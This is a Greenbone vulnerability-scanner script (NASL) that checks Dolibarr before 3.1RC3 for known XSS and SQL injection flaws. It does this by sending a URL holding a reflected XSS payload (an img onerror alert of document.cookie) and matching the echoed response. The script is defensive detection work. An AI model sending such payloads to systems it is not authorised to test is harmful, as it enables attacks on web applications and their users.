# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dolibarr:dolibarr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902644");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-12-15 14:02:22 +0530 (Thu, 15 Dec 2011)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_cve_id("CVE-2011-4814", "CVE-2011-4802");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dolibarr < 3.1RC3 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dolibarr_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dolibarr/http/detected");

  script_tag(name:"summary", value:"Dolibarr is prone to multiple cross-site scripting (XSS) and
  SQL injection (SQLi) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input

  - Passed via PATH_INFO to multiple scripts allows attackers to inject arbitrary HTML code.

  - Passed via the 'sortfield', 'sortorder', 'sall', 'id' and 'rowid' parameters to multiple
  scripts, which allows attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of a vulnerable site and to cause
  SQL Injection attack to gain sensitive information.");

  script_tag(name:"affected", value:"Dolibarr version 3.1.0RC and prior.");

  script_tag(name:"solution", value:"Update to version 3.1RC3 or later.");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2011/Nov/144");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50777");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520619");
  script_xref(name:"URL", value:"https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_dolibarr.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript:alert(document.cookie)%3E";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"onerror=javascript:alert\(document\.cookie\)>" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
